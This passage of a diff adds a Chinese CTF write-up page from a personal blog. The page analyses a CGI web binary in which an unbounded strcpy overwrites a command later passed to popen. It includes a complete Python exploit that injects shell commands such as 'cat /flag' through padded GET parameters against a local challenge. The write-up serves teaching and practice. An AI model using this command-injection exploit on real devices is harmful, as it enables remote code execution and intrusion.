+<li><code>2&gt;/dev/null</code>：将错误输出重定向到 <code>/dev/null</code>，忽略错误信息。</li>
+</ul>
+<p><strong><code>per_source = 5</code></strong>:</p>
+<ul>
+<li>限制每个源 IP 地址可以启动的服务实例数量为 5 个。</li>
+</ul>
+<p><strong><code>rlimit_cpu = 20</code></strong>:</p>
+<ul>
+<li>限制服务可以使用的最大 CPU 时间为 20 秒。</li>
+</ul>
+<p><strong><code>rlimit_as = 100M</code></strong>:</p>
+<ul>
+<li>限制服务使用的最大地址空间为 100 MB。</li>
+</ul>
+<p>**<code>access_times = 8:50-17:10</code>**（注释掉了）:</p>
+<ul>
+<li>如果启用，限制服务的访问时间。</li>
+</ul>
+<h4 id="环境搭建踩坑"><a href="#环境搭建踩坑" class="headerlink" title="环境搭建踩坑"></a>环境搭建踩坑</h4><p>这里题目给出的镜像如果直接build的话可能会有以下报错</p>
+
+
+<p>解决方法可以是在dockerfile中手动把requests的版本指定好，我本地requests&#x3D;&#x3D;2.21.0可以成功构建。</p>
+<p>然后IDA调试中，其中上面设置的信息的路径是容器中的路径，然后我用主机的6666端口映射到容器中gdbserver的默认端口</p>
+
+
+<p>之后patch时除了patch出一个死循环以外，还要把alarm给nop掉，不然会很快退出。</p>
+<p>之后要curl连的时候注意在容器中用的端口是它虚拟的端口，而不是主机映射的端口。（这里我把主机1337映射到容器1933端口）</p>
+
+
+
+
+
+
+<p>然后把死循环跳转改回来就可以继续调试了。这种方法也可以用于上一题的调试。</p>
+<h4 id="题目信息"><a href="#题目信息" class="headerlink" title="题目信息"></a>题目信息</h4><p>前面的一些检测正常发包是不会被卡住的，除非curl时手动加上的X-Forwarded-For长度或格式不对。</p>
+<p>main函数主要逻辑在这里，其中会从Cgi表中逐个匹配我们所请求的资源名，如果匹配上就检测X-Forwarded-For的值是否为192.168.1.x(x&lt;&#x3D;20)，这里dest全局变量就是存着X-Forwarded-For的值。v21是’?’后面的get请求参数，必须要有。v22是ring_token参数，也必须被设置。之后会调用对应的cgi函数。题目中的cgi函数有那么几个：login.cgi，logout.cgi，wifictl.cgi，logctl.cgi。</p>
+
+
+<p>然后我们查看函数表，发现里面有popen危险函数，然后看交叉引用就能找到logctl的具体实现。</p>
+
+
+
+
+<p>然后就能看到其具体实现，我们的目标就很明确了，想办法实现command的任意控制。</p>
+<h4 id="利用方式-1"><a href="#利用方式-1" class="headerlink" title="利用方式"></a>利用方式</h4><p>这里sscanf函数没见过，查一下是可以以一个格式化字符串匹配，然后把第一个参数分割成若干块存在后面的参数中。</p>
+<p><code>%[^:]</code>表示匹配直到遇到下一个冒号为止的所有字符，并将它们存储在第二个参数指定的字符数组中。</p>
+<p>首先得绕过logctl函数中前面两个判断，token的格式必须为 <code>数字:数字</code>，然后：前面的数字会和两个值进行比较，要在范围外才能过。那么我们继续看交叉引用。</p>
+
+
+
+
+<p>发现是一个时间值，而且如果调用wifictl会把这个值打印出来。那么只要先访问这个cgi，就可以得到time的值，而另一端边界值固定为0x3c，那么我们设置token前半部分为time+1就行。</p>
+<p>之后发现command的值与v5有关，sub_402CAC这个函数会获取特殊字符，而前面的ban_char函数则是漏洞所在点。</p>
+
+
+<p>主体逻辑是判断是否有v12中存的非法字符，我们通过logctl本体中<code>echo no support char is %s &gt; /var/www/blockingString</code>就能猜测这个逻辑。但是strcpy(s,a2)没有长度限制，可以溢出写v14，最后又会把v14写回a3，也就是v5，就实现了对command的控制。a2就是我们get传的参数值，上面会进行遍历参数键值对，所以我们用哪个参数触发漏洞都行。</p>
+<p>之后就能直接打了，由于是与web服务器交互，所以要用request库进行exp编写。这里我也懒得再写一份exp了，直接用提供的exp，改个端口，能正常获取flag。</p>
+<h5 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h5><pre><code class="python">import warnings
+import requests
+import re
+
+def exp(url):
+    if url[len(url) - 1] != &#39;/&#39;:
+        print(&quot;[-] Target URL Format Error,The last char in url must be &#39;/&#39;.&quot;)
+        return False
+    
+    warnings.filterwarnings(&#39;ignore&#39;)
+    s = requests.session()
+    s.verify = False
+    header = &#123;
+        &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36&#39;,
+        &#39;X-Forword-For&#39;: &#39;192.168.1.1&#39;
+    &#125;
+    
+    try:
+        # print(&quot;[+] login...&quot;)
+        ret = s.get(&quot;&#123;&#125;wifictl.cgi?ring_token=1&quot;.format(url), headers=header, timeout=8)
+        if ret.status_code == 200:
+            if &quot;now time is&quot; in ret.content.decode():
+                time_ret = re.search(r&quot;now time is (.+?)\.\n&quot;,ret.content.decode())
+                if time_ret is None:
+                    print(&quot;[-] time_ret re error, cannot get time&quot;)
+                    return False
+                else:
+                    now_time = time_ret.group(1)
+                    print(&quot;[+] now time is &quot; + now_time)
+            else:
+                print(&quot;[-] time_ret re error, cannot get time&quot;)
+                return False
+        else:
+            print(&quot;[-] status_code error, cannot get time&quot;)
+            return False
+        
+        cmd = &quot;a;&quot; + &quot;a&quot;*1311 + &quot;cat /flag &gt;/var/www/html/flag;&quot;       
+        new_url = &quot;&#123;&#125;logctl.cgi?ring_token=&#123;&#125;:1&amp;aa=&#123;&#125;&quot;.format(url, int(now_time)+1, cmd)
+        ret = s.get(new_url, headers=header, timeout=8)
+        ret = s.get(&quot;&#123;&#125;flag&quot;.format(url), headers=header, timeout=8)
+        if ret.status_code == 200:
+            print(ret.content.decode())
+        else:
+            print(&quot;[-] status_code error, cannot get flag&quot;)
+            return False
+        
+        cmd = &quot;a;&quot; + &quot;a&quot;*1311 + &quot;rm /var/www/html/flag;&quot;
+        new_url = &quot;&#123;&#125;logctl.cgi?ring_token=&#123;&#125;:1&amp;aa=&#123;&#125;&quot;.format(url, int(now_time)+1, cmd)
+        ret = s.get(new_url, headers=header, timeout=8)
+        if ret.status_code == 200:
+            return True
+        else:
+            print(&quot;[-] status_code error, cannot rm flag&quot;)
+            return False
+    
+    except Exception as reason:
+        if &#39;timed&#39; in repr(reason) or &#39;timeout&#39; in repr(reason):
+            print(&#39;[-] Fail, can not connect target for: timeout&#39;)
+            return False
+        else:
+            print(&#39;[-] Fail, can not connect target for: &#123;&#125;&#39;.format(repr(reason)))
+            return False
+
+if __name__ == &#39;__main__&#39;:
+    exp(&quot;http://127.0.0.1:1337/&quot;)
+</code></pre>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2024 Collectcrop&#39;s Blog
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;collectcrop
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+    
+
+
+
+
+    
+</body>
+</html>
